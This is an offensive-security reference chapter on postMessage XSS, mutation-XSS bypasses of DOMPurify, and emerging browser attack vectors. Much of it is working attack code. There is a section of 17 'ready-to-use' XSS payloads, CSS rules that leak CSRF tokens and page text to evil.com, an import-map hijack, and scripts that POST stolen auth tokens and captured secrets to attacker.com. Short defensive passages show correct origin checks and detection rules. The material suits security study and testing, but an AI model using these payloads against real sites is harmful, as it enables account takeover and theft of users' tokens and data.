# 29 - postMessage, Emerging & Future XSS Vectors

## Overview

This document covers three categories of advanced and forward-looking XSS attack surfaces: the `postMessage` API as a persistent source of DOM XSS, mutation XSS (mXSS) as a fundamental challenge to sanitizer-based defenses, and emerging vectors that exploit new browser APIs and specification features. These represent the cutting edge of XSS research as of 2024-2025.

**Sources**: [HackTricks - PostMessage Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities), [Intigriti - Exploiting PostMessage Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities), [Jorian Woltjer - postMessage Exploitation](https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation), [Jorge Lajara - PostMessage Vulnerabilities Part II](https://jlajara.gitlab.io/Dom_XSS_PostMessage_2), [TrustFoundry - postMessage XSS](https://trustfoundry.net/2024/07/30/a-quick-introduction-to-postmessage-xss/), [PortSwigger - Bypassing DOMPurify with mXSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss), [Securitum - mXSS via MathML Mutation](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/), [Securitum - DOMPurify 2.0.0 bypass](https://research.securitum.com/dompurify-bypass-using-mxss/), [CVE-2025-26791 Deep Dive](https://www.cve.news/cve-2025-26791/), [Mizu.re - DOMPurify Bypasses and Fixes](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes), [Flatt Security - Bypassing DOMPurify with XML](https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/), [Sonar - mXSS: The Vulnerability Hiding in Your Code](https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/), [ensy.zip - DOMPurify 3.2.3 Bypass](https://ensy.zip/posts/dompurify-323-bypass/), [BeaconRed - When Purification Fails](https://shaheen.beaconred.net/research/2025/05/28/when-purification-fails.html), [PMForce - Analyzing postMessage Handlers at Scale](https://swag.cispa.saarland/papers/steffens2020pmforce.pdf), [Ryukudz - Hunting postMessage Vulnerabilities](https://blog.ryukudz.com/posts/postmessage-part-1/), [Voorivex - CSS Data Exfiltration](https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token), [Mike Gualtieri - Stealing Data with CSS](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/), [Invicti - CSS Injection](https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection), [Microsoft Edge - Trusted Types](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/), [CybersGuards - Shadow DOM Guide 2025](https://cybersguards.com/shadow-dom/), [Imperva - Shadow DOM](https://www.imperva.com/learn/application-security/shadow-dom/)

---

## 1. postMessage Deep Dive

### 1.1 The postMessage Attack Surface

`window.postMessage()` enables cross-origin communication between windows (tabs, iframes, popups). It is one of the most common sources of DOM XSS because:

1. Developers frequently **omit origin validation** entirely
2. Origin checks are often **implemented incorrectly** with bypassable regex
3. The received `data` is passed to **dangerous sinks** (innerHTML, location.href, document.write)
4. The API is used pervasively in authentication flows, widget embedding, and SPA routing

### 1.2 Missing Origin Validation

The most basic vulnerability: the message handler does not check `event.origin`:

```javascript
// VULNERABLE: No origin check
window.addEventListener('message', function(event) {
  // Attacker from any origin can trigger this
  document.getElementById('output').innerHTML = event.data.html;
});

// EXPLOITATION from attacker page:
// <iframe src="https://target.com/page"></iframe>
// <script>
//   frames[0].postMessage({html: '<img src=x onerror=alert(1)>'}, '*');
// </script>
```

### 1.3 Regex Bypass for Origin Checks

Developers frequently use flawed regex patterns to validate origins:

**Unescaped dot**:
```javascript
// VULNERABLE: dot matches any character
if (event.origin.match(/https:\/\/trusted.example.com/)) { ... }
// BYPASS: https://trustedXexample.com (attacker-registered domain)
```

**Missing anchor ($)**:
```javascript
// VULNERABLE: no end anchor
if (/^https:\/\/trusted\.example\.com/.test(event.origin)) { ... }
// BYPASS: https://trusted.example.com.evil.com
```

**Missing start anchor (^)**:
```javascript
// VULNERABLE: no start anchor
if (/https:\/\/trusted\.example\.com$/.test(event.origin)) { ... }
// BYPASS: https://evil-trusted.example.com
```

**Both anchors missing**:
```javascript
// VULNERABLE
if (event.origin.indexOf('trusted.com') > -1) { ... }
// BYPASS: https://trusted.com.evil.com
// BYPASS: https://evil.com?trusted.com
```

### 1.4 String Method Bypasses

| Method | Vulnerable Pattern | Bypass Domain |
|--------|-------------------|---------------|
| `startsWith()` | `origin.startsWith('https://target.com')` | `https://target.com.evil.com` |
| `endsWith()` | `origin.endsWith('target.com')` | `https://evil-target.com` |
| `includes()` | `origin.includes('target.com')` | `https://evil.com?target.com` |
| `indexOf()` | `origin.indexOf('target.com') > -1` | `https://target.com.evil.com` |
| `match()` | `origin.match('target.com')` | `https://targetXcom.evil.com` |

### 1.5 Subdomain Matching Exploitation

Many applications trust all subdomains. If the attacker can find XSS on **any** subdomain, they can bypass the origin check:

```javascript
// Application trusts *.example.com
if (event.origin.endsWith('.example.com')) { ... }

// If attacker finds XSS on blog.example.com:
// 1. Exploit XSS on blog.example.com
// 2. From that context, postMessage to main app
// 3. Origin check passes: "https://blog.example.com".endsWith(".example.com")
```

This is a common pattern with bug bounty programs where seemingly low-impact XSS on a subdomain chains into critical impact on the main application.

### 1.6 postMessage to DOM Manipulation Chains

Common sinks that receive postMessage data:

```javascript
// Sink 1: innerHTML (DOM XSS)
element.innerHTML = event.data.content;

// Sink 2: location redirect (Open Redirect / XSS)
window.location.href = event.data.redirect_url;
// Payload: javascript:alert(document.domain)

// Sink 3: document.write
document.write(event.data.template);

// Sink 4: jQuery html()
$(event.data.selector).html(event.data.html);

// Sink 5: Script creation
const s = document.createElement('script');
s.src = event.data.scriptUrl;
document.head.appendChild(s);

// Sink 6: CSS injection
document.head.insertAdjacentHTML('beforeend',
  '<style>' + event.data.css + '</style>');

// Sink 7: Attribute setting
element.setAttribute(event.data.attr, event.data.value);
```

### 1.7 Cross-Origin Attack Patterns

**Attacker page embedding target as iframe**:
```html
<!DOCTYPE html>
<html>
<body>
<iframe id="target" src="https://target.com/vulnerable-page"></iframe>
<script>
  const target = document.getElementById('target');
  target.onload = function() {
    target.contentWindow.postMessage(
      { type: 'update', html: '<img src=x onerror=alert(document.domain)>' },
      'https://target.com'
    );
  };
</script>
</body>
</html>
```

**Attacker page opening target as popup**:
```html
<script>
  const w = window.open('https://target.com/vulnerable-page');
  setTimeout(() => {
    w.postMessage({ redirect: 'javascript:alert(document.domain)' }, '*');
  }, 3000);
</script>
```

### 1.8 Broadcast Channel as Same-Origin postMessage

The `BroadcastChannel` API functions as same-origin postMessage between tabs. If an application uses BroadcastChannel handlers with unsafe sinks, any same-origin XSS (even in a different page) can exploit it:

```javascript
// Attacker achieves XSS on https://target.com/any-page
const bc = new BroadcastChannel('app-updates');
bc.postMessage({ action: 'render', content: '<img src=x onerror=alert(1)>' });
// All tabs listening on 'app-updates' are compromised
```

---

## 2. Mutation XSS (mXSS) Deep Dive

### 2.1 What is mXSS

Mutation XSS occurs when an HTML sanitizer (like DOMPurify) processes input and deems it safe, but the browser's HTML parser subsequently **mutates** the sanitized output during DOM insertion, re-creating dangerous elements or attributes. The mutation happens because:

1. The sanitizer parses HTML one way
2. The browser re-parses it differently when inserted via innerHTML
3. The difference in parsing creates executable content

### 2.2 Current Research (2024-2025)

**April 2024 -- DOMPurify <= 3.1.0 Full Bypass** (by @IcesFont):
Exploited browser depth-limit flattening. When HTML is deeply nested beyond the browser's limit (~512 levels in Chrome), the browser auto-flattens nodes. This restructuring could move content out of safe contexts into dangerous ones, creating executable script content that DOMPurify missed.

**January 2025 -- CVE-2025-26791 (DOMPurify < 3.2.4)**:
A flaw in the TMPLIT_EXPR regex (`/${[\w\W]}/gm` changed to `/${[\w\W]/gm`) meant payloads omitting the closing brace of template literals could bypass SAFE_FOR_TEMPLATES sanitization. Combined with custom element handling, this enabled mXSS:

```html
<!-- CVE-2025-26791 PoC (requires SAFE_FOR_TEMPLATES + CUSTOM_ELEMENT_HANDLING) -->
<foo-test>
  <math>
    <mtext>
      <table>
        <mglyph>
          <mtext>
            <style>
              <img src=x onerror=alert(1)>
            </style>
          </mtext>
        </mglyph>
      </table>
    </mtext>
  </math>
</foo-test>
```
**Source**: [CVE-2025-26791 Deep Dive](https://www.cve.news/cve-2025-26791/), [Snyk Advisory](https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251)

**2025 -- DOMPurify 3.2.3 Non-Default Config Bypass**:
Discovered by ensy.zip, this bypass targets non-default DOMPurify configurations, demonstrating that even minor config changes can introduce mXSS vectors.
**Source**: [ensy.zip](https://ensy.zip/posts/dompurify-323-bypass/)

**2025 -- Flatt Security: DOMPurify Bypass via XML**:
Demonstrated that XML parsing mode differences between DOMPurify's parser and the browser's HTML parser can be exploited. DOMPurify uses an XML-based parsing path for certain inputs, and the difference in namespace handling creates mXSS opportunities.
**Source**: [Flatt Security](https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/)

**2025 -- BeaconRed: When Purification Fails**:
Documented techniques for exploiting DOMPurify's post-sanitization leftovers -- content that passes through the sanitizer but becomes dangerous through subsequent DOM operations.
**Source**: [BeaconRed](https://shaheen.beaconred.net/research/2025/05/28/when-purification-fails.html)

### 2.3 Browser-Specific Mutations

Different browsers parse and mutate HTML differently:

**Chromium-specific mutations**:
- Depth-limit flattening at ~512 nesting levels
- Table foster-parenting: content inside `<table>` but outside `<td>` gets moved before the table
- `<template>` tag special parsing rules

**Firefox-specific mutations**:
- Different namespace handling for MathML/SVG elements
- `<noscript>` tag content parsing differs based on scripting state

**Safari/WebKit-specific mutations**:
- Custom element upgrade timing differences
- Shadow DOM slot distribution mutations

### 2.4 Namespace Confusion (MathML/SVG)

The HTML spec defines special behavior for MathML and SVG integration points. Elements like `mglyph` and `malignmark` switch namespace based on their parent context:

```html
<!-- MathML namespace confusion -->
<math>
  <mtext>
    <table>
      <mglyph>
        <style>
          <!-- This style tag is in MathML namespace initially -->
          <!-- But on re-parse, it may be in HTML namespace -->
          <!-- Allowing content inside to be treated as HTML -->
          <img src=x onerror=alert(1)>
        </style>
      </mglyph>
    </table>
  </mtext>
</math>
```

**Source**: [Securitum - mXSS via MathML Mutation](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

### 2.5 Comment-Based mXSS

DOMPurify historically handled text node mutations but failed to account for HTML comments within attribute values:

```html
<!-- Comment-based mXSS pattern -->
<div title="&lt;!--">
  <img src=x onerror=alert(1)>
  <!-- -->
</div>
<!-- When re-parsed: the comment boundary shifts, -->
<!-- exposing the img tag as executable HTML -->
```

### 2.6 Custom Element Mutations

Custom elements (Web Components) introduce mutation vectors because:
1. Their upgrade lifecycle can alter DOM structure
2. Shadow DOM attachment can change parsing context
3. Sanitizers may not understand custom element semantics

```html
<!-- Custom element mXSS -->
<custom-element>
  <template shadowrootmode="open">
    <slot></slot>
  </template>
  <img src=x onerror=alert(1)>
</custom-element>
```

---

## 3. Emerging Vectors

### 3.1 CSS-Only Data Exfiltration

CSS injection can exfiltrate data without any JavaScript execution, bypassing script-based CSP:

**Attribute value exfiltration**:
```css
/* Steal CSRF token character-by-character */
input[name="csrf_token"][value^="a"] { background: url('https://evil.com/exfil?char=a'); }
input[name="csrf_token"][value^="b"] { background: url('https://evil.com/exfil?char=b'); }
/* ... repeat for all characters and positions */
input[name="csrf_token"][value^="ab"] { background: url('https://evil.com/exfil?chars=ab'); }
```

**Source**: [Voorivex - CSS Data Exfiltration to Steal OAuth Token](https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token)

**Blind CSS exfiltration** (no visible output):
```css
/* Using font-face unicode-range for text node exfiltration */
@font-face { font-family: exfil; src: url('https://evil.com/char?c=A'); unicode-range: U+0041; }
@font-face { font-family: exfil; src: url('https://evil.com/char?c=B'); unicode-range: U+0042; }
.target-element { font-family: exfil; }
/* Each character in the element triggers a different font request */
```

**Source**: [Mike Gualtieri - Stealing Data with CSS](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/)

CSS exfiltration bypasses CSP because `style-src` is typically more lenient than `script-src`, and `font-src` / `img-src` may allow external URLs.

### 3.2 Trusted Types Bypass Techniques

Trusted Types (TT) is a browser API that prevents DOM XSS by requiring typed objects for dangerous sinks. Bypass techniques include:

**Bypassing via existing Trusted Type policies**:
```javascript
// If application creates a permissive policy:
const policy = trustedTypes.createPolicy('lax', {
  createHTML: (input) => input  // No sanitization!
});
// Attacker can use this policy to create trusted HTML:
element.innerHTML = policy.createHTML('<img src=x onerror=alert(1)>');
```

**Bypassing via default policy**:
```javascript
// If a default policy exists with weak sanitization:
trustedTypes.createPolicy('default', {
  createHTML: (s) => s.replace(/<script>/gi, '')  // Weak filter
});
// Bypass: <scr<script>ipt>alert(1)</script>
// Or: <img src=x onerror=alert(1)>
```

**Bypassing via policy enumeration**:
Applications may create policies that are overly permissive. Attackers can enumerate and abuse them:
```javascript
// Check for existing policies
console.log(trustedTypes.defaultPolicy);
// Look for policy names in source code
```

**Source**: [Microsoft Edge - Trusted Types](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/)

### 3.3 Import Maps Manipulation

Import maps control how bare module specifiers resolve to URLs. If an attacker can inject or modify an import map, they can hijack module loading:

```html
<!-- Attacker-injected import map -->
<script type="importmap">
{
  "imports": {
    "lodash": "https://evil.com/fake-lodash.js",
    "react": "https://evil.com/fake-react.js"
  }
}
</script>

<!-- Application code loads from attacker's server -->
<script type="module">
  import _ from 'lodash';  // Loads evil.com/fake-lodash.js
</script>
```

**Attack requirements**: HTML injection before the application's import map or module scripts. Only the first import map in the document is used.

### 3.4 WebAssembly Payload Delivery

WebAssembly (Wasm) can be used to deliver XSS payloads that bypass text-based WAF/IDS signatures:

```javascript
// Compile and run Wasm that calls JavaScript
const bytes = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  // ... Wasm binary that imports and calls JS alert function
]);
const module = new WebAssembly.Module(bytes);
const instance = new WebAssembly.Instance(module, {
  env: { alert: (x) => alert(x) }
});
instance.exports.trigger();
```

Wasm payloads are binary, making them invisible to regex-based WAF rules that scan for `alert`, `onerror`, etc.

### 3.5 Declarative Shadow DOM XSS

Declarative Shadow DOM (DSD) allows Shadow DOM creation in HTML without JavaScript:

```html
<!-- Declarative Shadow DOM -->
<div>
  <template shadowrootmode="open">
    <style>:host { color: red; }</style>
    <slot></slot>
    <!-- Content inside template is parsed as shadow root -->
    <!-- If user input reaches here, XSS is possible -->
    <img src=x onerror=alert(1)>
  </template>
  Visible content
</div>
```

**Security implications**:
- Shadow DOM encapsulation is NOT a security boundary
- Styles and scripts inside shadow DOM execute normally
- Sanitizers may not properly handle DSD `<template shadowrootmode>` tags
- DSD can be used to bypass sanitizers that strip `<template>` but not its shadow root variant

**Source**: [CybersGuards - Shadow DOM Guide 2025](https://cybersguards.com/shadow-dom/), [Imperva - Shadow DOM](https://www.imperva.com/learn/application-security/shadow-dom/)

### 3.6 Speculation Rules API

The Speculation Rules API allows pages to pre-render or prefetch URLs. If an attacker can inject speculation rules, they can trigger pre-rendering of malicious pages:

```html
<script type="speculationrules">
{
  "prerender": [
    { "urls": ["https://evil.com/exploit"] }
  ]
}
</script>
```

While this does not directly execute scripts in the current page, it can:
- Pre-render attacker content in the browser (resource consumption)
- Trigger requests to attacker servers (tracking/exfiltration)
- Prime the cache with malicious responses for subsequent navigation

### 3.7 CSS-in-JS and Style Injection Escalation

Modern CSS-in-JS frameworks sometimes use patterns that create XSS from CSS injection:

```javascript
// If user input reaches CSS-in-JS templates:
const style = `
  .element {
    background: url('${userInput}');
  }
`;
// Payload: '); } .x { background: url('//evil.com/exfil?data=
// In some frameworks, this can escape to JS execution
```

---

## 4. Future Considerations

### 4.1 Browser Security Model Evolution

- **Origin-level isolation**: Site Isolation and COOP/COEP progressively limit cross-origin attacks
- **Spectre mitigations**: SharedArrayBuffer restrictions reduce timing-based exfiltration
- **Permission delegation**: APIs increasingly require user gestures, limiting silent exploitation
- **Sanitizer API**: Browser-native sanitization (`Sanitizer` API) may replace library-based sanitizers, potentially reducing mXSS surface

### 4.2 New API Security Implications

- **Compression Streams API**: Could be abused for CRIME/BREACH-style attacks in XSS context
- **File Handling API**: Registered file handlers could intercept sensitive file opens
- **Window Controls Overlay**: Overlay the title bar for advanced phishing
- **Web GPU**: GPU-based computation for password cracking or cryptomining via XSS
- **Navigation API**: New navigation interception capabilities may create new redirect/XSS vectors
- **View Transitions API**: Cross-document transitions may introduce new injection surfaces

### 4.3 AI and XSS

- LLM-generated responses rendered as HTML create new XSS surfaces (prompt injection to XSS)
- AI-based WAF bypass techniques using adversarial payloads
- Automated gadget discovery using ML-based code analysis

---

## 5. Ready-to-Use Emerging XSS Payloads

### Payload 1: postMessage with No Origin Check
```html
<iframe src="https://target.com/page" onload="this.contentWindow.postMessage({html:'<img src=x onerror=alert(document.domain)>'},'*')"></iframe>
```

### Payload 2: postMessage location.href Redirect
```html
<iframe src="https://target.com/page" onload="this.contentWindow.postMessage({url:'javascript:alert(document.domain)'},'*')"></iframe>
```

### Payload 3: Origin Check Bypass (startsWith)
```html
<!-- Register domain: target.com.evil.com -->
<script>
  window.open('https://target.com/page');
  // Send from https://target.com.evil.com - bypasses startsWith check
</script>
```

### Payload 4: Origin Check Bypass (unescaped dot)
```html
<!-- Register domain: targetXexample.com where X = any character -->
<script>
  // Bypasses /target.example.com/ regex where dot is wildcard
  window.open('https://target.com/page').postMessage('xss','*');
</script>
```

### Payload 5: mXSS via MathML Namespace Confusion
```html
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
```

### Payload 6: mXSS via Nesting Depth Flattening
```html
<!-- 513+ nested divs cause browser flattening -->
<div><div><div><!-- ... 513 levels ...--><img src=x onerror=alert(1)><!-- ... close tags --></div></div></div>
```

### Payload 7: mXSS via Comment Boundary
```html
<div title="<!--"><img src=x onerror=alert(1)>-->"></div>
```

### Payload 8: CSS Attribute Exfiltration (CSRF Token)
```html
<style>
input[name="token"][value^="a"]{background:url('//evil.com/?t=a')}
input[name="token"][value^="b"]{background:url('//evil.com/?t=b')}
input[name="token"][value^="c"]{background:url('//evil.com/?t=c')}
</style>
```

### Payload 9: CSS Font-Based Text Exfiltration
```html
<style>
@font-face{font-family:x;src:url(//evil.com/?c=a);unicode-range:U+61}
@font-face{font-family:x;src:url(//evil.com/?c=b);unicode-range:U+62}
.secret{font-family:x}
</style>
```

### Payload 10: Import Map Hijack
```html
<script type="importmap">{"imports":{"app":"//evil.com/app.js"}}</script>
```

### Payload 11: Declarative Shadow DOM Bypass
```html
<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>
```

### Payload 12: Trusted Types Default Policy Abuse
```javascript
// If default policy exists with weak filtering:
document.body.innerHTML = '<img src=x onerror=alert(1)>'
// Default policy's createHTML is called automatically
// Weak filter = bypass
```

### Payload 13: Speculation Rules Injection
```html
<script type="speculationrules">{"prerender":[{"urls":["//evil.com/track"]}]}</script>
```

### Payload 14: postMessage via BroadcastChannel (Same-Origin)
```javascript
// From any same-origin XSS context:
new BroadcastChannel('app').postMessage({
  action:'render', data:'<img src=x onerror=alert(1)>'
})
```

### Payload 15: SVG foreignObject mXSS
```html
<svg><foreignObject><math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math></foreignObject></svg>
```

### Payload 16: Nested Template mXSS
```html
<template><style></template><img src=x onerror=alert(1)></style></template>
```

### Payload 17: Window.name Cross-Origin Data Smuggling
```javascript
// From attacker page:
window.name = '<img src=x onerror=alert(document.domain)>';
location = 'https://target.com/page-that-reads-window-name';
```

---

## 6. Testing Methodology for postMessage Vulnerabilities

### Step 1: Discover Message Handlers
```javascript
// In browser console, find all message listeners:
// Use getEventListeners(window) in Chrome DevTools
// Or override addEventListener:
const orig = window.addEventListener;
window.addEventListener = function(type, fn, opts) {
  if (type === 'message') console.log('Message handler found:', fn.toString());
  return orig.call(this, type, fn, opts);
};
```

### Step 2: Analyze Origin Validation
- Check if `event.origin` is validated
- Test regex bypasses (missing anchors, unescaped dots)
- Test string method bypasses (startsWith, endsWith, includes)
- Test subdomain trust (find XSS on any subdomain)

### Step 3: Identify Sinks
- Trace how `event.data` flows through the handler
- Look for innerHTML, location.href, document.write, jQuery html()
- Check if data is passed to other functions that eventually reach sinks

### Step 4: Craft Exploit
- Build attacker page that opens/iframes the target
- Send crafted postMessage with XSS payload
- Verify execution in the target origin

### Tools:
- **PMForce**: Automated postMessage handler analysis
- **Burp DOM Invader**: Identifies postMessage sinks
- **postMessage Logger** (browser extension): Records all postMessage traffic

---

## 7. Testing Methodology for mXSS

1. **Identify sanitizer**: Check if DOMPurify, sanitize-html, or browser Sanitizer API is used
2. **Check version**: Known bypasses are version-specific
3. **Test namespace confusion**: MathML and SVG elements with style/script children
4. **Test nesting depth**: Generate deeply nested HTML (500+ levels)
5. **Test comments**: HTML comments in attribute values and between elements
6. **Test custom elements**: `<template shadowrootmode>`, custom tag names
7. **Test encoding**: Double-encoding, entity encoding in unexpected positions
8. **Test config**: Non-default sanitizer options often introduce bypasses
9. **Compare parsing**: Parse with DOMParser, check output, set as innerHTML, inspect for differences

---
## [2024-2026 Research Update]

### postMessage Exploitation: Advanced Techniques and Real-World Chains

#### CVE-2024-49038 -- Microsoft Teams Zero-Click XSS via postMessage (CVSS 9.3)

Microsoft's MSRC published a detailed analysis (August 2025) of a critical postMessage exploitation chain in Microsoft Teams and Copilot Studio. The attack achieved zero-click XSS across tenants.

**Attack Chain:**
1. The Teams app manifest included `isFullTrust: true`, enabling communication with the main Teams window and token access
2. An overly broad `validDomains` list trusted all `*.microsoft.com` subdomains
3. The attacker hosted a payload under a `*.microsoft.com` domain (via dangling domain or subdomain takeover)
4. A crafted postMessage triggered the host window to return an authentication token
5. The XSS alert fired with no user interaction, working across tenants

**Source:** [Microsoft MSRC Blog - PostMessaged and Compromised](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)

**Reproduction Steps:**
1. Identify a Teams app with `isFullTrust: true` in its manifest
2. Review the `validDomains` list for overly broad wildcard entries
3. Find a controllable subdomain under a trusted domain (e.g., abandoned `*.microsoft.com` subdomain)
4. Host an HTML page on the controlled subdomain that sends a postMessage to the Teams host window requesting token exchange
5. The host window processes the message without additional origin validation beyond the manifest's validDomains
6. The token is returned via postMessage to the attacker-controlled frame

```javascript
// Simplified CVE-2024-49038 exploitation concept
// Attacker page hosted on controllable *.microsoft.com subdomain
window.parent.postMessage({
  type: 'token-request',
  resource: 'https://graph.microsoft.com'
}, '*');

window.addEventListener('message', function(event) {
  // Receive token from Teams host
  if (event.data && event.data.token) {
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({
        token: event.data.token,
        origin: event.origin
      })
    });
  }
});
```

#### indexOf() Origin Bypass -- Detailed Exploitation

The `indexOf()` method is frequently misused for origin validation and is trivially bypassed:

```javascript
// VULNERABLE: indexOf returns position, not boolean match
window.addEventListener('message', function(event) {
  if (event.origin.indexOf('trusted.com') !== -1) {
    // Process message -- UNSAFE
    eval(event.data.code);
  }
});

// Bypass domains:
// https://trusted.com.evil.com       -- indexOf('trusted.com') returns 8
// https://evil.com?trusted.com       -- indexOf('trusted.com') returns 16
// https://nottrusted.com             -- indexOf('trusted.com') returns 3
// https://evil-trusted.com           -- indexOf('trusted.com') returns 10
```

**Chaining indexOf with wildcard postMessage targets:**
```javascript
// Many apps send sensitive data with wildcard target
window.parent.postMessage({
  type: 'auth',
  token: sessionToken,
  user: currentUser
}, '*');  // Any window can receive this

// Attacker embeds target as iframe and catches the token:
// <iframe src="https://target.com/app"></iframe>
// The message handler in the attacker page receives the token
```

#### Regex Coercion Bypass

When `String.prototype.match()` receives a non-RegExp argument, JavaScript implicitly converts it to a RegExp. This creates bypass opportunities:

```javascript
// VULNERABLE: match() with string argument
window.addEventListener('message', function(event) {
  if (event.origin.match('trusted.example.com')) {
    // Dot is treated as regex wildcard, not literal dot
    processData(event.data);
  }
});

// Bypass: https://trustedXexampleYcom.evil.com
// The dot matches any character, so 'X' and 'Y' satisfy the pattern

// VULNERABLE: Unescaped special characters
if (event.origin.match('api.v2.trusted.com')) { ... }
// Bypass: https://apixv2ytrustedxcom.evil.com
```

**Correct implementation:**
```javascript
// SAFE: Use URL constructor + exact match
window.addEventListener('message', function(event) {
  try {
    var origin = new URL(event.origin);
    if (origin.hostname === 'trusted.example.com' &&
        origin.protocol === 'https:') {
      processData(event.data);
    }
  } catch(e) {}
});
```

#### Synchronous Gadget Race Attacks

The "Postviewer v5" technique demonstrates exploiting JavaScript's single-threaded event loop to win race conditions against legitimate postMessage handlers:

**Concept:**
When a target page sends sensitive data via postMessage after a rendering operation, an attacker can stall the parent or target page's event loop using a synchronous gadget (e.g., `alert()`, synchronous XHR, or a blocking loop), install a message listener during the stall, and capture the secret before the legitimate handler processes it.

```javascript
// Attacker opens target as popup
var targetWindow = window.open('https://target.com/page-that-posts-secrets');

// Stall event loop with synchronous gadget to install listener first
// Technique 1: Synchronous XHR (blocks main thread)
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/slow-endpoint', false); // synchronous
xhr.send();

// Listener installed during the synchronous stall captures the message
window.addEventListener('message', function(event) {
  // Capture secret sent by target before legitimate handler processes it
  fetch('https://attacker.com/stolen', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(event.data)
  });
});

// Technique 2: Popup-based race (when target is not frameable)
// The attacker stalls their own page's event loop, preventing
// the target popup's messages from being processed until the
// attacker's listener is installed
```

**When the target page is not frameable (X-Frame-Options/CSP frame-ancestors):**
- Use `window.open()` to open the target as a popup
- The race is still winnable by exploiting the timing between the popup loading and sending its postMessage
- Synchronous gadgets in the opener page delay processing until the attacker's listener is ready

#### Dangling Domain Hijacking

Abandoned domains still listed in application trust configurations (manifests, validDomains, CORS allowlists) can be re-registered by attackers:

**Attack Pattern:**
1. Enumerate domains in application manifests, configuration files, or CORS response headers
2. Check each trusted domain for availability (expired registration, abandoned subdomains)
3. Register or take over the abandoned domain
4. Host a postMessage exploitation page on the hijacked domain
5. The application's origin validation accepts messages from the attacker-controlled domain

```javascript
// Example: Application trusts domains listed in its manifest
// manifest.json: { "validDomains": ["app.oldpartner.com", "widget.legacy.com"] }

// If oldpartner.com is expired and re-registered by attacker:
// 1. Set up app.oldpartner.com with attacker content
// 2. The Teams/Slack/etc. app accepts postMessages from this origin
// 3. Attacker sends crafted messages to trigger XSS or token theft
```

**Detection via CodeQL:**
Microsoft MSRC published CodeQL patterns for detecting postMessage vulnerabilities:
- Flag `postMessage` calls whose second argument is `"*"` (wildcard target origin)
- Flag `message` event handlers that never test `event.origin`
- Flag origin validation using `indexOf()`, `includes()`, `startsWith()`, or `endsWith()` without proper anchoring

**Source:** [Microsoft MSRC Blog](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)

#### Additional postMessage Security Considerations (2024-2026)

**isTrusted Property Check:**
The `isTrusted` property on MessageEvent should be verified to ensure the event was generated by a user action or browser API rather than programmatically dispatched:

```javascript
window.addEventListener('message', function(event) {
  if (!event.isTrusted) return; // Reject synthetic events
  if (event.origin !== 'https://trusted.example.com') return;
  // Process event.data safely
});
```

**Source:** [TEKNKL Blog - Checking isTrusted in MessageEvent Listeners](https://blog.teknkl.com/you-should-probably-be-checking-istrusted-in-messageevent-listeners/)

**DOM Clobbering + postMessage + CSP Bypass Chain:**
PortSwigger nominated a 2024 technique chaining DOM clobbering with postMessage and CSP bypasses. A `javascript:` URL sent via postMessage was used to exploit XSS on Bing.

**Source:** [PortSwigger Top 10 Web Hacking Techniques 2024](https://portswigger.net/research/top-10-web-hacking-techniques-of-2024-nominations-open)
